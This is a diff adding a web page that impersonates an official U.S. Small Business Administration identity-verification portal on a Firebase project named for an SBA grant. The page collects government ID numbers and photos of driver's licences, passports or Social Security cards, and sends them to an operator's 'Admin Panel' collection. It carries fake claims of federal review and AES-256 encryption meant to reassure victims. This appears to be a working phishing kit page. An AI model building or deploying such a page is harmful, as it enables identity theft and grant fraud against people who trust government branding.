@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Identity Authentication</title>
+    <style>
+        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --sba-accent: #1e3a8a; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
+        
+        .upload-area { 
+            border: 2px dashed #cbd5e1; 
+            border-radius: 12px; 
+            padding: 25px; 
+            text-align: center; 
+            margin-bottom: 15px; 
+            background: #fff; 
+            cursor: pointer; 
+            transition: 0.3s;
+        }
+        .upload-area:hover { border-color: var(--sba-blue); background: #f8fafc; }
+        
+        .preview-text { font-size: 10px; color: #10b981; margin-top: 8px; font-weight: 800; }
+        
+        .instruction-box { 
+            background: #fffbeb; 
+            border: 1px solid #fef3c7; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-bottom: 20px; 
+            font-size: 11px; 
+            color: #92400e; 
+            line-height: 1.5; 
+        }
+
+        .form-label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        select, input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
+        
+        #form-container { display: none; padding: 15px; max-width: 500px; margin: 0 auto; }
+        
+        .submit-btn {
+            background: var(--sba-blue);
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            width: 100%;
+            font-weight: 800;
+            border: none;
+            margin-top: 20px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .submit-btn:disabled { background: #94a3b8; cursor: not-allowed; }
+
+        .security-badge { font-size: 9px; color: #64748b; text-align: center; margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE PORTAL
+    </div>
+
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight: 900;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">RETURN</button>
+    </div>
+
+    <div id="loading-state" style="text-align: center; margin-top: 100px;">
+        <div style="color: var(--sba-blue); font-weight: 800; font-size: 12px; letter-spacing: 1px;">ESTABLISHING SECURE SESSION...</div>
+    </div>
+
+    <div id="form-container">
+        <div id="kyc-content">
+            <div style="background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-red);">
+                <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0 0 10px;">ID Authentication</h2>
+                
+                <div class="instruction-box">
+                    <b>FEDERAL COMPLIANCE NOTICE:</b><br>
+                    Please provide clear photos of your government-issued ID. High-resolution captures are required for facial recognition matching.
+                </div>
+                
+                <label class="form-label">Identification Type</label>
+                <select id="idType">
+                    <option value="Driver's License">U.S. Driver's License</option>
+                    <option value="State ID">State Issued ID Card</option>
+                    <option value="Passport">U.S. Passport</option>
+                    <option value="SSN Card">Social Security Card</option>
+                </select>
+
+                <label class="form-label">ID / Document Number</label>
+                <input type="text" id="idNumber" placeholder="Enter number exactly as shown">
+
+                <label class="form-label">Front of Document</label>
+                <div class="upload-area" onclick="document.getElementById('fileFront').click()">
+                    <span id="iconFront" style="font-size: 24px;">📸</span>
+                    <b style="display:block; font-size:11px; margin-top:5px; color:var(--sba-blue);">UPLOAD FRONT IMAGE</b>
+                    <input type="file" id="fileFront" hidden accept="image/*">
+                    <div class="preview-text" id="frontName"></div>
+                </div>
+
+                <label class="form-label">Back of Document</label>
+                <div class="upload-area" onclick="document.getElementById('fileBack').click()">
+                    <span id="iconBack" style="font-size: 24px;">📸</span>
+                    <b style="display:block; font-size:11px; margin-top:5px; color:var(--sba-blue);">UPLOAD BACK IMAGE</b>
+                    <input type="file" id="fileBack" hidden accept="image/*">
+                    <div class="preview-text" id="backName"></div>
+                </div>
+
+                <button id="uploadBtn" class="submit-btn">Transmit Documents</button>
+
+                <div class="security-badge">
+                    🔒 AES-256 END-TO-END ENCRYPTION ACTIVE
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, doc, getDoc, updateDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        let userProfile = {};
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) { window.location.href = 'index.html'; return; }
+
+            const userSnap = await getDoc(doc(db, "users", user.uid));
+            userProfile = userSnap.data() || {};
+            
+            // Normalize status to uppercase for reliable checking
+            const kStatus = (userProfile.kycStatus || "NOT STARTED").toUpperCase();
+            document.getElementById('loading-state').style.display = 'none';
+            document.getElementById('form-container').style.display = 'block';
+
+            // ONLY block them if status is strictly PENDING. 
+            // If it is REJECTED, this IF is ignored and they see the form.
+            if (kStatus === "PENDING") {
+                document.getElementById('kyc-content').innerHTML = `
+                    <div style="background: white; padding: 40px 20px; border-radius: 15px; text-align: center; border-top: 5px solid #f59e0b; box-shadow: 0 10px 25px rgba(0,0,0,0.1);">
+                        <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
+                        <h3 style="color: var(--sba-blue); margin-bottom: 10px;">IDENTITY AUDIT IN PROGRESS</h3>
+                        <p style="font-size: 13px; color: #475569; line-height: 1.6; padding: 0 20px;">
+                            The Federal Review Board has received your documents. Your account is currently under <b>Level 2 Security Audit</b>.
+                        </p>
+                        <div style="background: #f1f5f9; padding: 10px; border-radius: 8px; font-size: 11px; color: #64748b; margin: 20px 0;">
+                            Estimated Review Time: 12 - 24 Hours
+                        </div>
+                        <button onclick="location.href='dashboard.html'" class="submit-btn" style="background:#64748b;">Return to Portal</button>
+                    </div>
+                `;
+            } else if (kStatus === "APPROVED") {
+                document.getElementById('kyc-content').innerHTML = `
+                    <div style="background: white; padding: 40px 20px; border-radius: 15px; text-align: center; border-top: 5px solid #10b981; box-shadow: 0 10px 25px rgba(0,0,0,0.1);">
+                        <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
+                        <h3 style="color: var(--sba-blue); margin-bottom: 10px;">IDENTITY VERIFIED</h3>
+                        <p style="font-size: 13px; color: #475569; line-height: 1.6;">
+                            Your government identity has been successfully authenticated.
+                        </p>
+                        <button onclick="location.href='dashboard.html'" class="submit-btn">Return to Dashboard</button>
+                    </div>
+                `;
+            }
+        });
+
+        const processImg = (file) => new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = (e) => {
+                const img = new Image();
+                img.src = e.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const scale = Math.min(800 / img.width, 800 / img.height);
+                    canvas.width = img.width * scale;
+                    canvas.height = img.height * scale;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    resolve(canvas.toDataURL('image/jpeg', 0.7)); 
+                };
+            };
+        });
+
+        document.getElementById('fileFront').onchange = (e) => { 
+            if(e.target.files[0]) {
+                document.getElementById('frontName').innerText = "DOCUMENT FRONT READY";
+                document.getElementById('iconFront').innerText = "✅";
+            }
+        };
+        document.getElementById('fileBack').onchange = (e) => { 
+            if(e.target.files[0]) {
+                document.getElementById('backName').innerText = "DOCUMENT BACK READY";
+                document.getElementById('iconBack').innerText = "✅";
+            }
+        };
+
+        const uploadBtn = document.getElementById('uploadBtn');
+        uploadBtn.onclick = async () => {
+            const front = document.getElementById('fileFront').files[0];
+            const back = document.getElementById('fileBack').files[0];
+            const num = document.getElementById('idNumber').value.trim();
+
+            if(!front || !back || !num) return alert("REQUIRED: Document images and ID number must be provided.");
+
+            uploadBtn.disabled = true;
+            uploadBtn.innerText = "ENCRYPTING DATA...";
+
+            try {
+                const fData = await processImg(front);
+                const bData = await processImg(back);
+
+                // Send to Admin Panel
+                await addDoc(collection(db, "requests"), {
+                    userId: auth.currentUser.uid,
+                    userName: userProfile.fullName || "Applicant",
+                    userEmail: auth.currentUser.email,
+                    type: "KYC VERIFICATION",
+                    frontImg: fData,
+                    backImg: bData,
+                    idNumber: num,
+                    idType: document.getElementById('idType').value,
+                    status: "PENDING",
+                    timestamp: serverTimestamp()
+                });
+
+                // Update User Status immediately
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    kycStatus: "PENDING",
+                    status: "PENDING AUDIT"
+                });
+
+                alert("TRANSMISSION SUCCESSFUL: Your identity audit has begun.");
+                window.location.href = 'dashboard.html';
+            } catch (err) {
+                console.error(err);
+                alert("NETWORK ERROR: Data not transmitted. Please try again.");
+                uploadBtn.disabled = false;
+                uploadBtn.innerText = "Transmit Documents";
+            }
+        };
+    </script>
+</body>
+</html>
